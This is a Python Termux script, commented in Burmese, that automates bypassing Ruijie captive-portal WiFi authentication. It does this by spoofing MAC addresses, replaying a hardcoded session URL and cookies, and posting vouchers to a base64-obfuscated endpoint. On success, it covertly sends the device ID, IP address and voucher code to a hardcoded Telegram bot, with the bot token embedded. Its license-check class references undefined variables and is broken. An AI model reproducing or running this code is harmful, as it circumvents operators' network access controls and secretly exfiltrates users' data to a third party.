import re, requests, random, base64, os, json, hashlib, time, sys, threading, socket, uuid, platform
from datetime import datetime
import urllib3

# Warning များကို ပိတ်ထားရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIG_FILE = "config_kp.json"
CACHE_FILE = os.path.expanduser("~/.aiden_license_cache.json")


# --- Security & Telegram Configuration ---
TELEGRAM_BOT_TOKEN = "8778201970:AAHz1Ulh8uJM55AImdjcjvfkvWNWLvLE4-0c"
TELEGRAM_CHAT_ID = "7632580640"
# GitHub Configuration အပိုင်း

EXPIRY_DATE_STR = "Fetching..."
IS_EXPIRED = False
TARGET_EXPIRY_DT = None

R, G, Y, B, P, C, W, N = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m", "\033[0m"

def banner():
    print("\033[1;35m" + "="*56)
    print("██╗    ██╗     ██╗██╗██╗")
    print("██╗  ██╗       ██╗      ██╗")
    print("██╗██╗         ██╗██╗██╗")
    print("██╗  ██╗       ██╗")
    print("██╗    ██╗     ██╗")
    print("╚═╝    ╚═╝     ╚═╝")
    print("="*56 + "\033[0m")
    print("\033[1;36m                    WELCOME TO KP\033[0m")
    print(f"{G} Device ID : {W}{security_system.device_id}{N}")
    print(f"{Y} Expire    : {W}{EXPIRY_DATE_STR}{N}")
    print(f"{B}-------------------------------------------------------{N}")

def start_ping_monitor():
    print(f"\033[1;36m[*] Starting Live Internet Ping Monitor (Press CTRL+C to Stop)...\033[0m\n")
    host = "8.8.8.8"
    cmd = ["ping", "-c", "1", "-W", "2", host]
    try:
        while True:
            import subprocess
            start_time = time.time()
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = proc.communicate()
            if proc.returncode == 0:
                out_str = stdout.decode('utf-8', errors='ignore')
                time_match = re.search(r"time=([\d.]+)\s*ms", out_str)
                if time_match:
                    ping_ms = float(time_match.group(1))
                    if ping_ms < 100.0:
                        print(f"\033[1;32m[ TRUE ] Internet Connected | Latency: {ping_ms} ms\033[0m")
                    elif ping_ms < 250.0:
                        print(f"\033[1;33m[ WARN ] Internet Connected | Latency: {ping_ms} ms\033[0m")
                    else:
                        print(f"\033[1;31m[ FALSE ] Internet Connected | Latency: {ping_ms} ms\033[0m")
                else:
                    print("\033[1;32m[ TRUE ] Internet Connected | Latency: Reply OK\033[0m")
            else:
                print("\033[1;31m[ FALSE ] Request Timed Out / Connection Lost\033[0m")
            elapsed = time.time() - start_time
            if elapsed < 1.0: time.sleep(1.0 - elapsed)
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Script terminated by user. Exiting...\033[0m")
        sys.exit(0)

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_config(mac, ip, voucher):
    config = {"mac_address": mac, "gateway_ip": ip, "voucher": voucher}
    with open(CONFIG_FILE, "w") as f: json.dump(config, f, indent=4)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_device_id():
    # Model ရော Android ID (Secure ID) ပါ ပေါင်းပြီး ထုတ်ယူခြင်း
    model = os.popen('getprop ro.product.model').read().strip()
    android_id = os.popen('settings get secure android_id').read().strip()
    
    # အကယ်၍ settings က ဖတ်မရခဲ့ရင် build id ကို backup အနေနဲ့ သုံးမယ်
    if not android_id:
        android_id = os.popen('getprop ro.build.id').read().strip()
        
    combined = f"{model}{android_id}"
    return hashlib.md5(combined.encode()).hexdigest().upper()[:10]


def send_telegram_msg(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try: requests.post(url, json=payload, timeout=4)
    except: pass



def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)       
    return url

def get_gateway_ip_auto():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def auto_catch_portal():
    print(f"{Y}[*] Auto-catching Ruijie Portal Details...{N}")
    gateways = [get_gateway_ip_auto(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]
    gateways = list(dict.fromkeys(gateways)) 

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept': '*/*'
    }
    portal_url = None

    for gw in gateways:
        target = f"http://{gw}"
        try:
            res = requests.get(target, headers=headers, timeout=3, allow_redirects=True)
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url
                break
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                if extracted.startswith("http"):
                    portal_url = extracted
                else:
                    portal_url = "https://portal-as.ruijienetworks.com" + extracted
                break
        except:
            pass

    if not portal_url:
        try:
            res = requests.get("http://httpbin.org/get", headers=headers, timeout=3)
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url
            else:
                match = re.search(r"href=['\"](.*?)['\"]", res.text)
                if match and "portal-as.ruijienetworks.com" in match.group(1):
                    portal_url = match.group(1)
        except:
            pass

    if portal_url:
        api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
        api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        gw_match = re.search(r'gw_address=([^&]+)', api_url)
        mac_match = re.search(r'mac=([^&]+)', api_url)
        
        gw_address = gw_match.group(1) if gw_match else None
        mac_value = mac_match.group(1) if mac_match else None
        return gw_address, mac_value, portal_url
    return None, None, None

def get_session_id():
    config = load_config()
    old_mac = config.get("mac_address", "")
    old_ip = config.get("gateway_ip", "")

    # အလိုအလျောက် ရှာဖွေစစ်ဆေးခြင်း
    auto_gw, auto_mac, raw_portal_url = auto_catch_portal()
    
    global gw_ip, saved_user_mac
    
    if auto_gw and auto_mac:
        print(f"\n{G}[✓] Auto-Catcher Found Valid Ruijie Session!{N}")
        print(f"{C}[ Wifi GW ]  : {W}{auto_gw}")
        print(f"{C}[ Phone MAC ] : {W}{auto_mac}{N}")
        print(f"{Y}[*] Press ENTER to use these details, or type custom info below:{N}\n")
        
        user_mac = input(f"[?] Enter Phone MAC Address [{auto_mac}]: ").strip() or auto_mac
        gw_ip = input(f"[?] Enter Gateway IP [{auto_gw}]: ").strip() or auto_gw
    else:
        # အင်တာနက်ပွင့်နေလျှင် (သို့မဟုတ်) ရှာမတွေ့လျှင် Ping တန်းပြေးရန် စစ်ဆေးခြင်း
        print(f"\n{R}[❌] Auto-Catcher Failed to find Portal URL. Checking active network...{N}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(("8.8.8.8", 53))
            s.close()
            print(f"{G}[!] Network is already online. Skipping extraction.{N}")
            return "ALREADY_ONLINE"
        except:
            pass
            
        print(f"\n{B}--- [ Manual Input Mode ] ---{N}")
        print(f"\033[1;34m[ Current MAC ]: {old_mac}\033[0m" if old_mac else "[ No Saved MAC ]")
        user_mac = input("[?] Enter your Phone MAC Address: ").strip() or old_mac
        
        print(f"\033[1;34m[ Current Gateway ]: {old_ip}\033[0m" if old_ip else "[ No Saved Gateway ]")
        gw_ip = input("[?] Enter Gateway IP: ").strip() or old_ip

    saved_user_mac = user_mac

    session_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25bf05ddc&gw_sn=H1U40B400486C&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.152&mac=1a:e5:f9:2d:21:1b&slot_num=11&nasip=192.168.1.159&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C251&chap_challenge=%5C123%5C121%5C325%5C044%5C226%5C345%5C334%5C007%5C152%5C020%5C046%5C056%5C305%5C145%5C245%5C252"
    session_url = replace_mac(session_url, user_mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie':'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    
    response = requests.get(session_url, headers=headers)
    print(response)
    try:
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url).group(1)
    except:
        session_id = None
    return session_id

def login_voucher(session_id, voucher):
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        with requests.post(post_url, json=data, headers=headers) as response:
            response = response.text
            
            # phoneNumber= နောက်က ဂဏန်းတွေကို ကြယ်ပွင့် (******) အဖြစ် လဲလှယ်ပြီးမှ ပြသခြင်း
            masked_response = re.sub(r'phoneNumber=\d+', 'phoneNumber=******', response)
            print(masked_response)
            
            return re.search('token=(.*?)&', response).group(1)
    except Exception as Error:
        print(Error)
    
def send():
    global gw_ip, saved_user_mac
    session_id = get_session_id()
    if not session_id: return
    print("Inactive Session Id: ", session_id)
    
    config = load_config()
    old_voucher = config.get("voucher", "")
    
    print(f"\033[1;34m[ Current Voucher ]: {old_voucher}\033[0m" if old_voucher else "[ No Saved Voucher ]")
    user_voucher = input("[?] Enter Voucher Code : ").strip()
    
    if not user_voucher and old_voucher:
        user_voucher = old_voucher
        
    # အချက်အလက်အားလုံးကို နောက်တစ်ကြိမ် Enter ခေါက်ရုံဖြင့် ပြန်သုံးနိုင်ရန် သိမ်းဆည်းခြင်း
    save_config(saved_user_mac, gw_ip, user_voucher)


    active_session_id = login_voucher(session_id, user_voucher)
    print("Active Session Id: ", active_session_id)
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
    params = {
            'token': active_session_id,
            'phoneNumber': 'ဒါလေးတောင်မတတ်ရင်လုပ်မနေနဲ့တော့',
    }
    
    # Gateway IP အလိုက် Request ပို့ရန်
    try:
        res = requests.get(f'http://{gw_ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=False)
        redirect_url = res.headers.get('Location', '')
        response_text = res.text.lower()
        
        # ၁။ ပထမဆုံး Voucher လော့ဂ်အင် မအောင်မြင်ခဲ့ရင် တန်းပြီး Failed ပြမယ်
        if not active_session_id:
            print("\n\033[1;31m[❌] Internet Bypass Failed (Active Session ID is None)\033[0m")
            
        # ၂။ အောင်မြင်တဲ့ အခြေအနေတွေကို သေချာစစ်မယ် (မှန်ရင် အရင်လို အစိမ်းရောင်နဲ့ ပြပေးမည်)
        elif res.status_code in [302, 200] and (
            "baidu" in redirect_url or 
            "maccauth" in redirect_url or 
            "ruijienetworks" in redirect_url or 
            "auth_status\":1" in response_text or 
            "errcode\":0" in response_text
        ):
            print("\n\033[1;32m[✓] Internet Bypass Successful!\033[0m")
            time.sleep(1)
            return True
        else:
            print("\n\033[1;31m[❌] Internet Bypass Failed\033[0m")
            return False
            
    except Exception as e:
        print(f"Request Error: {e}")
        return False

class DeviceSecurity:
    def __init__(self):
        self.device_id = get_device_id()

    def check_device(self):
        global EXPIRY_DATE_STR, IS_EXPIRED, TARGET_EXPIRY_DT
        live_url = f"{GITHUB_API_URL}?v={uuid.uuid4().hex}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Aiden-Security-Client",
            "Cache-Control": "no-cache"
        }
        
        # --- အင်တာနက်ရှိရင် GitHub ကနေ စစ်ဆေးပြီး Cache ထဲ သိမ်းမည့်အပိုင်း ---
        try:
            resp = requests.get(live_url, headers=headers, timeout=4)
            if resp.status_code == 200:
                data = resp.json()
                file_content = base64.b64decode(data['content']).decode('utf-8')
                json_data = json.loads(file_content)
                devices = json_data.get("devices", [])
                
                all_ids = [d.get("id") for d in devices]
                if self.device_id not in all_ids:
                    EXPIRY_DATE_STR = "Removed from Server"
                    IS_EXPIRED = True
                    return False
                
                device_info = None
                for d in devices:
                    if d.get("id") == self.device_id:
                        device_info = d
                        break
                
                if device_info.get("status") != "active":
                    EXPIRY_DATE_STR = "Blocked Device"
                    IS_EXPIRED = True
                    return False
                
                expire_str = device_info.get("expire", "")
                
                # အင်တာနက်ရှိလို့ လိုင်စင်အောင်မြင်ရင် ဖုန်းထဲမှာ Cache အဖြစ် အချက်အလက်လှမ်းသိမ်းမယ်
                try:
                    with open(CACHE_FILE, "w") as f:
                        json.dump({"expire": expire_str, "status": device_info.get("status")}, f)
                except:
                    pass
                    
            else:
                raise Exception("Server Error")
                
        # --- အင်တာနက်မရှိရင် (သို့) Error တက်ရင် ဖုန်းထဲက Cache အဟောင်းကို ပြန်ဖတ်မည့်အပိုင်း ---
        except:
            if os.path.exists(CACHE_FILE):
                try:
                    with open(CACHE_FILE, "r") as f:
                        cache_data = json.load(f)
                    expire_str = cache_data.get("expire", "")
                    if cache_data.get("status") != "active":
                        EXPIRY_DATE_STR = "Blocked Device (Offline)"
                        IS_EXPIRED = True
                        return False
                except:
                    EXPIRY_DATE_STR = "No Internet & Cache Error"
                    IS_EXPIRED = True
                    return False
            else:
                # Cache ဖိုင်လည်း မရှိသေးဘူး၊ အင်တာနက်လည်း မရှိရင် ပေးမသုံးပါဘူး
                EXPIRY_DATE_STR = "No Internet (First Time Connect Required)"
                IS_EXPIRED = True
                return False

        # --- ရလာတဲ့ ရက်စွဲ (Online သို့မဟုတ် Offline Cache က ရက်စွဲ) ကို သက်တမ်းစစ်ဆေးခြင်း ---
        try:
            expiry_dt = datetime.strptime(expire_str, "%Y-%m-%d %H:%M")
            TARGET_EXPIRY_DT = expiry_dt
            if datetime.now() > expiry_dt:
                EXPIRY_DATE_STR = f"{expire_str} (EXPIRED)"
                IS_EXPIRED = True
                return False
            else:
                EXPIRY_DATE_STR = expire_str
                IS_EXPIRED = False
                return True
        except ValueError:
            EXPIRY_DATE_STR = "Invalid Date Format"
            IS_EXPIRED = True
            return False


if __name__ == '__main__':
    try:
        os.system("clear" if os.name == "posix" else "cls")
        
        # Device ID ပုံမှန်အတိုင်း ပြသနိုင်ရန် ဆောက်ပေးခြင်း
        class Blank: pass
        security_system = Blank()
        security_system.device_id = get_device_id()
        
        banner()
        
        bypass_status = send()
        
        if bypass_status:
            os.system("clear" if os.name == "posix" else "cls")
            banner()
            
            config = load_config()
            used_voucher = config.get("voucher", "")
            current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            ip_addr = get_local_ip()
            
            telegram_text = (
                "🔔 Voucher Client is now ONLINE on Termux!\n"
                f"🆔 Device ID: {security_system.device_id}\n"
                f"🌐 IP Address: {ip_addr}\n"
                f"🎟️ Voucher code: {used_voucher}\n"
                f"⏰ Time: {current_time}"
            )
            send_telegram_msg(telegram_text)
            
            start_ping_monitor()
        else:
            print(f"\033[1;31m[!] Bypass Failed. Script Stopped.\033[0m")
            sys.exit(1)
                
    except KeyboardInterrupt:
        print(f"\n{R}[!] Script terminated by user. Exiting...{N}")
